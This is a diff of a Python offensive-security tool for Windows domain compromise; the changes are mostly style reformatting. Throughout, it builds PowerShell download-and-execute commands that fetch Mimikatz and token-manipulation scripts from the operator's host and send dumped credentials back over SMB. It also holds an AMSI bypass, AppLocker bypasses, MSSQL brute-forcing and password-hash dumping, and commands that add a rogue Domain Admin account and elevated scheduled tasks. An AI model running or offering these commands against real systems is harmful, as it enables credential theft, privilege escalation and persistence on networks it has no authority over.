@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#pip install pymssql
+# pip install pymssql
 
+import resource
 from deps.psexec import *
 from deps.wmiexec import *
 from deps.smbexec import *
@@ -22,7 +23,8 @@ import base64
 import binascii
 import cmd
 import commands
-import glob, subprocess
+import glob
+import subprocess
 import logging
 import os
 import pyasn1
@@ -30,7 +32,9 @@ import random
 import re
 #import socket
 import ipaddress
-import socket, commands, sys
+import socket
+import commands
+import sys
 import string
 import sys
 import tempfile
@@ -116,7 +120,7 @@ bold = True
 origScriptPath = os.getcwd()
 
 domainAdminList = []
-#domainUserList=[]
+# domainUserList=[]
 
 localUserList = []
 attemptedCredList = []
@@ -166,7 +170,7 @@ class ForkingSimpleServer(ForkingMixIn, HTTPServer):
     pass
 
 
-#class RequestHandler(SimpleHTTPRequestHandler):
+# class RequestHandler(SimpleHTTPRequestHandler):
 #    def do_GET(self):
 #        print "here123"
 #        #self.send_response(200)
@@ -237,12 +241,12 @@ class RemoteOperationsReg:
         self.__serviceHandle = ans['lpServiceHandle']
         ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
         if ans['lpServiceStatus']['dwCurrentState'] \
-            == scmr.SERVICE_STOPPED:
+                == scmr.SERVICE_STOPPED:
             logging.info('Service %s is in stopped state' % self.__serviceName)
             self.__shouldStop = True
             self.__started = False
         elif ans['lpServiceStatus']['dwCurrentState'] \
-            == scmr.SERVICE_RUNNING:
+                == scmr.SERVICE_RUNNING:
             logging.debug('Service %s is already running' % self.__serviceName)
             self.__shouldStop = False
             self.__started = True
@@ -350,12 +354,12 @@ class RegHandler:
                                            self.__nthash)
             except Exception, e:
                 if 'bad username or authentication information' \
-                    in str(e):
+                        in str(e):
                     if len(self.__lmhash) < 1 and len(self.__nthash) \
-                        < 1:
+                            < 1:
                         if [targetIP, 'Access Denied', self.__username
-                            + '|' + self.__password, None] \
-                            not in tmpRegResultList3:
+                                + '|' + self.__password, None] \
+                                not in tmpRegResultList3:
                             tmpRegResultList3.append([
                                 targetIP, 'Access Denied',
                                 self.__username + '|' + self.__password, None
@@ -554,7 +558,7 @@ class RegHandler:
     def __parse_lp_data(valueType, valueData):
         try:
             if valueType == rrp.REG_SZ or valueType \
-                == rrp.REG_EXPAND_SZ:
+                    == rrp.REG_EXPAND_SZ:
                 if type(valueData) is int:
                     print 'NULL'
                 else:
@@ -597,7 +601,8 @@ def getNetBiosName(ip):
 
 
 def cleanUp():
-    import glob, os
+    import glob
+    import os
     for f in glob.glob(origScriptPath + "/modules/*.bat"):
         os.remove(f)
 
@@ -755,8 +760,8 @@ def appLockerBypass2(targetIP, domain, username, password, passwordHash, cmd):
 
     #cmd = 'powershell "IEX (New-Object Net.WebClient).DownloadString(\'http://'+targetIP+':8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\'+myIP+'\\guest\\'+targetIP+'_mimikatz.txt"'
     #f = open(origScriptPath+"/loot/"+'callMimikatz.ps1', 'w')
-    #f.write(cmd)
-    #f.close()
+    # f.write(cmd)
+    # f.close()
 
     cmd = 'copy \\\\' + myIP + '\\guest\\build.xml C:\\windows\\temp /y'
     results, status = runWMIEXEC(targetIP, domain, username, password,
@@ -792,7 +797,7 @@ def appLockerBypass4(targetIP, domain, username, password, passwordHash,
     print(setColor(
         "[*]", bold, color="blue")) + " " + targetIP + ":445 | " + (setColor(
             "[applocker]", color="green")) + " | AppLocker Bypass Technique 4"
-    #https://github.com/Cn33liz/CScriptShell
+    # https://github.com/Cn33liz/CScriptShell
     if getCPUType(targetIP, domain, username, password, passwordHash) == True:
         filename = 'C:\Windows\Microsoft.NET\Framework64\\v3.5\csc.exe '
     else:
@@ -807,7 +812,7 @@ def appLockerBypass4(targetIP, domain, username, password, passwordHash,
         filedata = file.read()
     #filedata = filedata.replace('PLACEHOLDER', 'IEX (New-Object Net.WebClient).DownloadString(\'http://is.gd/oeoFuI\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\\\\\'+myIP+'\\\\guest\\\\'+targetIP+'_mimikatz.txt')
     #command=command.replace("Out-File \\","Out-File \\\\\\\\")
-    #command=command.replace("'","\\'")
+    # command=command.replace("'","\\'")
     command = command.replace("\\", "\\\\")
     filedata = filedata.replace('PLACEHOLDER', command)
     with open(origScriptPath + '/modules/bypass/CScriptShell.cs', 'w') as file:
@@ -833,9 +838,10 @@ def appLockerBypass4(targetIP, domain, username, password, passwordHash,
         cmd = 'C:\\Windows\\System32\\cscript.exe c:\\windows\\temp\\CScriptShell.js'
         return cmd
 
+    # C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /r:System.EnterpriseServices.dll,System.Management.Automation.dll /target:library /out:CScriptShell.dll /keyfile:key.snk CScriptShell.cs
+    # cscript.exe CScriptShell.js
 
-    #C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /r:System.EnterpriseServices.dll,System.Management.Automation.dll /target:library /out:CScriptShell.dll /keyfile:key.snk CScriptShell.cs
-    #cscript.exe CScriptShell.js
+
 def listDatabases(db, conn):
     sql_query = 'USE master; SELECT NAME FROM sysdatabases;'
     results = conn.RunSQLQuery(db, sql_query, tuplemode=False, wait=True)
@@ -860,7 +866,7 @@ def listTables(db, conn, dbName):
         if x.values()[3] == 'BASE TABLE':
             tableList.append([x.values()[0], x.values()[2]])
     return tableList
-    #print tabulate(tableList)
+    # print tabulate(tableList)
 
 
 def listColumns(db, conn, dbName, tableName):
@@ -871,7 +877,7 @@ def listColumns(db, conn, dbName, tableName):
         columnName = x.values()[-1]
         columnList.append([dbName, tableName, columnName])
     return columnList
-    #print tabulate(results)
+    # print tabulate(results)
 
 
 def sampleData(db, conn, dbName, tableName):
@@ -1204,7 +1210,7 @@ def bruteMSSQLAuto(hostNo, portNo):
                         for y in tmpPasswordList:
                             if y not in userPassList:
                                 userPassList.append(y)
-                        #if len(tmpPasswordList)>0:
+                        # if len(tmpPasswordList)>0:
                         #    print "\n"
                         print(setColor("[+]", bold, color="green")
                               ) + " Dumping Hashes from Host: " + ip
@@ -1230,10 +1236,10 @@ def bruteMSSQLAuto(hostNo, portNo):
                         cmd = cmd1 + " && " + cmd2 + " && " + cmd3
                         tmpResultList = execXPCMDShell(hostNo, port, username,
                                                        password, domain, cmd)
-                        #if "The operation completed successfully." in str(tmpResultList):
+                        # if "The operation completed successfully." in str(tmpResultList):
                     dumpMSSQLHash(hostNo, portNo, username, password, domain)
                     dumpMSSQLIDF(hostNo, portNo, username, password, domain)
-                    #runMimikatz(hostNo,'workgroup',tmpCreateUsername,tmpCreatePassword,None)
+                    # runMimikatz(hostNo,'workgroup',tmpCreateUsername,tmpCreatePassword,None)
 
                     continueNext = True
                     break
@@ -1516,7 +1522,7 @@ def dumpMSSQLHash(hostNo, port, username, password, domain):
                                         password, query)
         else:
             tmpResultList = runSQLQuery(hostNo, username, password, query)
-        #for x in tmpResultList:
+        # for x in tmpResultList:
         #   print x.split("\t")
     else:
         query = "SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
@@ -1560,7 +1566,7 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
                                         password, query)
         else:
             tmpResultList = runSQLQuery(hostNo, username, password, query)
-        #for x in tmpResultList:
+        # for x in tmpResultList:
         #   print x.split("\t")
     else:
         query = "SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
@@ -1569,7 +1575,7 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
                                         password, query)
         else:
             tmpResultList = runSQLQuery(hostNo, username, password, query)
-        #for x in tmpResultList:
+        # for x in tmpResultList:
         #   print x.split("\t")
 
     tmpDBList = []
@@ -1606,7 +1612,9 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
     for x in tmpTableList:
         dbName = x[0]
         tableName = x[1]
-        query = "use " + dbName + ";SELECT name FROM syscolumns WHERE id=OBJECT_ID('" + tableName + "')"
+        query = "use " + dbName + \
+            ";SELECT name FROM syscolumns WHERE id=OBJECT_ID('" + \
+            tableName + "')"
         if len(domain) > 0:
             tmpResultList = runSQLQuery(hostNo, domain + "\\" + username,
                                         password, query)
@@ -1631,12 +1639,12 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
         dbName = key.split("|")[0]
         tableName = key.split("|")[1]
         tmpResultList.append([hostNo, dbName, tableName, value])
-    #if len(domain)>0:
+    # if len(domain)>0:
     #    tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[MSSQL] [Find Columns]", bold, color="green"))
-    #else:
+    # else:
     #    tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+username+":"+password+" | "+(setColor("[MSSQL] [Find Columns]", bold, color="green"))
-    #print tmpFooter
-    #print tabulate(tmpResultList,headers=["Host","Database","Table","Column(s)"])
+    # print tmpFooter
+    # print tabulate(tmpResultList,headers=["Host","Database","Table","Column(s)"])
     tmpFooter = ''
     for x in tmpResultList:
         tmpHostNo = x[0]
@@ -1653,7 +1661,7 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
                 setColor("[+]", bold, color="green")
             ) + " " + hostNo + ":445 | " + username + ":" + password + " | " + (
                 setColor("[MSSQL] [Interesting Data]", bold, color="green"))
-    #print "\n"
+    # print "\n"
     for key, value in dict.iteritems():
         dbName = key.split("|")[0]
         tableName = key.split("|")[1]
@@ -1665,7 +1673,8 @@ def dumpMSSQLIDF(hostNo, port, username, password, domain):
         tmpColumnList.insert(0, "Host")
         tmpColumnList.insert(1, "Database")
         tmpColumnList.insert(2, "Table")
-        query = 'use ' + dbName + ';select top 10 ' + columnName + ' from ' + tableName + ';'
+        query = 'use ' + dbName + ';select top 10 ' + \
+            columnName + ' from ' + tableName + ';'
         try:
             if len(domain) > 0:
                 tmpResultList = runSQLQuery(hostNo, domain + "\\" + username,
@@ -1712,7 +1721,7 @@ def testMSSQL1(host,
             print dumpSQLHashes(db, fp, True)
         else:
             print dumpSQLHashes(db, fp, False)
-        #listDatabases(db,fp)
+        # listDatabases(db,fp)
         dbName = 'mmsdata1'
         tableList = listTables(db, fp, dbName)
         for x in tableList:
@@ -1751,7 +1760,7 @@ def testMSSQL1(host,
             continue
 
 
-#MSSQL Test
+# MSSQL Test
 
 
 def testAdminAccess(tmphostno, tmpdomain, tmpusername, tmppassword,
@@ -1839,7 +1848,8 @@ def testDomainCredentials(username, password, passwordHash, ip, domain,
 def testDomainCredentials1(username, password, hostNo):
     ansi_escape = re.compile(r'\x1b[^m]*m')
     password = ansi_escape.sub('', password)
-    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + "  -c 'enumdomgroups'"
+    cmd = "rpcclient -U " + username + "%'" + \
+        password + "' " + hostNo + "  -c 'enumdomgroups'"
     resultList = runCommand(cmd, shell=True, timeout=30)
     if "group:" in str(resultList):
         return True
@@ -1850,7 +1860,8 @@ def testDomainCredentials1(username, password, hostNo):
 def getDomainAdminUsers(username, password, hostNo):
     foundStatus = False
     userList1 = []
-    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + " -c 'enumdomusers'"
+    cmd = "rpcclient -U " + username + "%'" + \
+        password + "' " + hostNo + " -c 'enumdomusers'"
     resultList = runCommand(cmd, shell=True, timeout=15)
     if debugMode == True:
         print cmd
@@ -1864,10 +1875,13 @@ def getDomainAdminUsers(username, password, hostNo):
         except IndexError:
             continue
 
-    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + " -c 'enumdomgroups' | grep -i 'Domain Admin' | awk -F'rid:' '{print $2}' | sed 's:^.\(.*\).$:\\1:'"
+    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + \
+        " -c 'enumdomgroups' | grep -i 'Domain Admin' | awk -F'rid:' '{print $2}' | sed 's:^.\(.*\).$:\\1:'"
     resultList = runCommand(cmd, shell=True, timeout=15)
     groupID = (resultList[1]).strip()
-    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + " -c 'querygroupmem " + groupID + "' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
+    cmd = "rpcclient -U " + username + "%'" + password + "' " + hostNo + \
+        " -c 'querygroupmem " + groupID + \
+        "' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
     unFoundList = []
     resultList = runCommand(cmd, shell=True, timeout=15)
     list1 = resultList[1].split("\n")
@@ -1882,7 +1896,9 @@ def getDomainAdminUsers(username, password, hostNo):
             unFoundList.append(x)
     for x in unFoundList:
         #cmd = "/opt/local/bin/rpcclient -U "+username+"%"+password+" "+ip+" -c 'querygroupmem "+x+"' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
-        cmd = "rpcclient -U " + username + "%" + password + " " + ip + " -c 'querygroupmem " + x + "' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
+        cmd = "rpcclient -U " + username + "%" + password + " " + ip + \
+            " -c 'querygroupmem " + x + \
+            "' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
         resultList = runCommand(cmd, shell=True, timeout=15)
         list1 = resultList[1].split("\n")
         for x in list1:
@@ -2055,7 +2071,7 @@ def parseMimikatzOutput(list1):
             username1 = username1.strip()
             password1 = password1.strip()
             if len(username1) > 1 and len(domain1) > 1 and len(password1) > 1:
-                #if (domain1!="(null)" or username1!="(null)" or password1!="(null)"):
+                # if (domain1!="(null)" or username1!="(null)" or password1!="(null)"):
                 if domain1 != "(null)":
                     if not username1.endswith("$") and len(password1) < 50:
                         if "\\" in username1:
@@ -2074,7 +2090,7 @@ def parseMimikatzOutput(list1):
                 password1 = ""
                 lmHash = ""
                 ntHash = ""
-    #if len(tmpPasswordList)>0:
+    # if len(tmpPasswordList)>0:
     #    print (setColor("[+]", bold, color="green"))+" Found the below credentials via Mimikatz"
     #    headers = ["Domain","Username","Password"]
     #    print tabulate(tmpPasswordList,headers,tablefmt="simple")
@@ -2084,8 +2100,8 @@ def parseMimikatzOutput(list1):
 def analyzeHashes(hashList):
     print(setColor("[+]", bold,
                    color="green")) + " Analyzing Hashes for Patterns"
-    #Blank 31d6cfe0d16ae931b73c59d7e0c089c0
-    #NoLM  aad3b435b51404eeaad3b435b51404ee
+    # Blank 31d6cfe0d16ae931b73c59d7e0c089c0
+    # NoLM  aad3b435b51404eeaad3b435b51404ee
     tmpBlankHashList = []
     tmpHashList = {}
     for x in hashList:
@@ -2143,7 +2159,7 @@ def analyzeHashes1(hashList):
                 print "[*] The below accounts use the password hash " + hashStr
             print hostStr
             print "\n"
-        #print tabulate(tmpResultList,headers)
+        # print tabulate(tmpResultList,headers)
 
 
 def analyzePasswords(tmpPassList):
@@ -2341,14 +2357,15 @@ def testPowershell(targetIP, domain, username, password, passwordHash):
 
         return False
     else:
-        #if "rpc_s_access_denied" in results:
+        # if "rpc_s_access_denied" in results:
         #    return False
-        #else:
+        # else:
         return True
 
 
 def addressInNetwork(ip, net):
-    import socket, struct
+    import socket
+    import struct
     ipaddr = int(''.join(['%02x' % int(x) for x in ip.split('.')]), 16)
     netstr, bits = net.split('/')
     netaddr = int(''.join(['%02x' % int(x) for x in netstr.split('.')]), 16)
@@ -2460,7 +2477,8 @@ def updateMimiStaging(targetIP, domain, username, password, passwordHash):
                                        passwordHash)
 
     if applockerBypass == True:
-        command = ' IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/mimiStage1.ps1\'); Invoke-Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"'
+        command = ' IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + \
+            ':8000/mimiStage1.ps1\'); Invoke-Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"'
         newCmd = ''
         randomCount = (randint(1, 2))
         if randomCount == 1:
@@ -2477,7 +2495,9 @@ def updateMimiStaging(targetIP, domain, username, password, passwordHash):
         results, status = runWMIEXEC(targetIP, domain, username, password,
                                      passwordHash, newCmd)
     else:
-        command = powershellPath + " " + powershellArgs + "-Command IEX (New-Object Net.WebClient).DownloadString('http://" + myIP + ":8000/mimiStage1.ps1'); Invoke-Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+        command = powershellPath + " " + powershellArgs + \
+            "-Command IEX (New-Object Net.WebClient).DownloadString('http://" + myIP + \
+            ":8000/mimiStage1.ps1'); Invoke-Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
         results, status = runWMIEXEC(targetIP, domain, username, password,
                                      passwordHash, command)
 
@@ -2550,10 +2570,14 @@ def runMimikatz(targetIP, domain, username, password, passwordHash):
                                                      username, password,
                                                      passwordHash, tmpCmd)
                         if '2.0.50727.4927' in results:
-                            command = powershellPath + " -Version 2 " + powershellArgs + " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                            command = powershellPath + " -Version 2 " + powershellArgs + \
+                                " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + \
+                                myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
                         else:
                             amsiBypassStr = "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
-                            command = powershellPath + " " + powershellArgs + "-Command " + amsiBypassStr + "; IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                            command = powershellPath + " " + powershellArgs + "-Command " + amsiBypassStr + \
+                                "; IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + \
+                                myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
                     else:
                         if password == None:
                             print(
@@ -2567,7 +2591,9 @@ def runMimikatz(targetIP, domain, username, password, passwordHash):
                             ) + " " + targetIP + ":445 | " + domain + "\\" + username + ":" + password + " | " + (
                                 setColor("[mimikatz] ", bold,
                                          color="green")) + "Running Mimikatz"
-                        command = powershellPath + " " + powershellArgs + " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                        command = powershellPath + " " + powershellArgs + \
+                            " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + \
+                            myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\""
                 else:
                     if amsiMode == True:
                         if password == None:
@@ -2589,17 +2615,23 @@ def runMimikatz(targetIP, domain, username, password, passwordHash):
                                                      username, password,
                                                      passwordHash, tmpCmd)
                         if '2.0.50727.4927' in results:
-                            command = powershellPath + " -Version 2 " + powershellArgs + " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                            command = powershellPath + " -Version 2 " + powershellArgs + \
+                                " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+                                ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
                         else:
                             amsiBypassStr = "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
-                            command = powershellPath + " " + powershellArgs + "-Command " + amsiBypassStr + "; IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                            command = powershellPath + " " + powershellArgs + "-Command " + amsiBypassStr + \
+                                "; IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+                                ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
                     else:
                         print(
                             setColor("[+]", bold, color="green")
                         ) + " " + targetIP + ":445 | " + domain + "\\" + username + ":" + password + " | " + (
                             setColor("[obfs][mimikatz] ", bold,
                                      color="green")) + "Running Mimikatz"
-                        command = powershellPath + " " + powershellArgs + " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
+                        command = powershellPath + " " + powershellArgs + \
+                            " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+                            ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""
                 if debugMode == True:
                     print command
                 results, status = runWMIEXEC(targetIP, domain, username,
@@ -2680,14 +2712,18 @@ def runMimikatz(targetIP, domain, username, password, passwordHash):
                             [targetIP, tmpDomain, tmpUsername, tmpPassword])
             else:
                 if obfuscatedMode == False:
-                    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\" + myIP + "\\guest\\" + targetIP + "_mimikatz.txt"
+                    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+                        ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\" + \
+                        myIP + "\\guest\\" + targetIP + "_mimikatz.txt"
                 else:
                     print(setColor(
                         "[*]", bold, color="blue"
                     )) + " " + targetIP + ":445 | " + (setColor(
                         "[mimikatz][obfs]",
                         color="green")) + " | Enable Powershell Obfuscation"
-                    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\" + myIP + "\\guest\\" + targetIP + "_mimikatz.txt"
+                    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+                        ":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\" + \
+                        myIP + "\\guest\\" + targetIP + "_mimikatz.txt"
 
                 if applockerBypass == True:
                     newCmd = ''
@@ -2831,18 +2867,19 @@ def powershell_encode(data):
 
 def uploadFile(remoteFilename, localFilename, targetIP, domain, username,
                password, passwordHash):
-    command = "copy \\\\" + myIP + "\\files\\" + remoteFilename + " C:\\windows\\temp /y"
+    command = "copy \\\\" + myIP + "\\files\\" + \
+        remoteFilename + " C:\\windows\\temp /y"
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, command)
     if debugMode == True:
         print command
         print results
-    #osArch64=getCPUType(targetIP,domain,username,password,passwordHash)
-    #powershellPath=getPowershellPath(osArch64)
+    # osArch64=getCPUType(targetIP,domain,username,password,passwordHash)
+    # powershellPath=getPowershellPath(osArch64)
     #powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
     #command=powershellPath+" "+powershellArgs+" -Command (New-Object System.Net.WebClient).DownloadFile('http://"+myIP+":8000/"+remoteFilename+"', 'C:\\windows\\temp\\"+localFilename+"')"
     #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
-    #if debugMode==True:
+    # if debugMode==True:
     #    print command
     #    print results
 
@@ -2878,7 +2915,8 @@ def getPowershellVersionBak(targetIP, domain, username, password,
                             passwordHash):
     powershellPath = 'powershell.exe'
     powershellArgs = ' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
-    command = powershellPath + " " + powershellArgs + " -Command $Env:PROCESSOR_ARCHITECTURE"
+    command = powershellPath + " " + powershellArgs + \
+        " -Command $Env:PROCESSOR_ARCHITECTURE"
     try:
         results, status = runWMIEXEC(targetIP, domain, username, password,
                                      passwordHash, command)
@@ -2910,9 +2948,13 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
     if len(dcList) > 0:
         dcNetbiosName = getNetBiosName(dcList[0])
     if obfuscatedMode == True:
-        command = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-TokenManipulation-obfs.ps1\'); Invoke-TokenManipulation | Out-File \\\\" + myIP + "\\guest\\" + targetIP + "_tokens.txt"
+        command = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+            ":8000/Invoke-TokenManipulation-obfs.ps1\'); Invoke-TokenManipulation | Out-File \\\\" + \
+            myIP + "\\guest\\" + targetIP + "_tokens.txt"
     else:
-        command = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-TokenManipulation.ps1\'); Invoke-TokenManipulation | Out-File \\\\" + myIP + "\\guest\\" + targetIP + "_tokens.txt"
+        command = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+            ":8000/Invoke-TokenManipulation.ps1\'); Invoke-TokenManipulation | Out-File \\\\" + \
+            myIP + "\\guest\\" + targetIP + "_tokens.txt"
     if applockerBypass == True:
         randomCount = (randint(1, 2))
         if randomCount == 1:
@@ -3001,7 +3043,7 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
                             "[+]", bold, color="green"
                         )) + " Found Domain Admin Token: '" + foundUser + "'"
 
-                        #print "[*] Checking Currently Logged On Users on Host: "+targetIP
+                        # print "[*] Checking Currently Logged On Users on Host: "+targetIP
                         command = ' -Command "Get-WMIObject -class Win32_ComputerSystem | select username"'
                         command = powershellPath + " " + powershellArgs + command
                         #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
@@ -3023,7 +3065,7 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
                                         print str(x).lower()
                                 if '--------' in x:
                                     foundStart = True
-                        #print "[*] UAC is Disabled on Host: "+targetIP
+                        # print "[*] UAC is Disabled on Host: "+targetIP
                         print "[*] Attempting to Elevate Privileges Using Token: '" + foundUser + "'"
 
                         tmpUserList1 = []
@@ -3070,7 +3112,8 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
                                 setColor("[+]", bold, color="green")
                             ) + " Adding new Domain Admin Account to Host: " + ip
                             target = open(tmpFilename3, 'w')
-                            cmd = 'net user /add ' + tmpCreateUsername + ' "' + tmpCreatePassword + '" /domain'
+                            cmd = 'net user /add ' + tmpCreateUsername + \
+                                ' "' + tmpCreatePassword + '" /domain'
                             target.write(cmd + "\r\n")
                             cmd = 'net group "Domain Admins" ' + tmpCreateUsername + ' /add /domain'
                             target.write(cmd + "\r\n")
@@ -3079,9 +3122,11 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
                                        domain, username, password,
                                        passwordHash)
 
-                            s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/Invoke-TokenManipulation.ps1\');Invoke-TokenManipulation -CreateProcess \'cmd.exe\' -Username ' + foundUser + ' -ProcessArgs \'/c C:\\windows\\TEMP\\' + tmpFilename3 + '\''
-                            #encodedPS=powershell_encode(s)
-                            cmd = powershellPath + " -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass  " + s
+                            s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/Invoke-TokenManipulation.ps1\');Invoke-TokenManipulation -CreateProcess \'cmd.exe\' -Username ' + \
+                                foundUser + ' -ProcessArgs \'/c C:\\windows\\TEMP\\' + tmpFilename3 + '\''
+                            # encodedPS=powershell_encode(s)
+                            cmd = powershellPath + \
+                                " -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass  " + s
                             if debugMode == True:
                                 print cmd
                             target = open(tmpFilename2, 'w')
@@ -3099,7 +3144,8 @@ def tokensPriv(targetIP, domain, username, password, passwordHash):
                                 print command
                                 print results
 
-                            command = 'schtasks.exe /Create /RL HIGHEST /RU ' + impersonateUser + ' /TN ' + tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + tmpFilename2 + "\""
+                            command = 'schtasks.exe /Create /RL HIGHEST /RU ' + impersonateUser + ' /TN ' + \
+                                tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + tmpFilename2 + "\""
                             results, status = runWMIEXEC(
                                 targetIP, domain, username, password,
                                 passwordHash, command)
@@ -3204,14 +3250,14 @@ def listProcesses(targetIP, domain, username, password, passwordHash):
     if debugMode == True:
         print command
         print results
-    #tmpResultList1=results[0].split("\n")
-    #tmpResultList2=[]
-    #for x in tmpResultList1:
+    # tmpResultList1=results[0].split("\n")
+    # tmpResultList2=[]
+    # for x in tmpResultList1:
     #    processName=(x.split(",")[0])[1:-1]
     #    if processName not in tmpResultList2:
     #        if len(str(processName))>0:
     #            tmpResultList2.append(str(processName))
-    #return tmpResultList2
+    # return tmpResultList2
     return results
     '''
     command=powershellCmdStart+" -Command \"get-process | select name\""
@@ -3232,7 +3278,8 @@ def listProcesses(targetIP, domain, username, password, passwordHash):
 
 def sessionGopher(targetIP, domain, username, password, passwordHash):
     #command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher -Thorough"'
-    command = powershellCmdStart + ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + ':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher"'
+    command = powershellCmdStart + ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + \
+        ':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher"'
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, command)
     if debugMode == True:
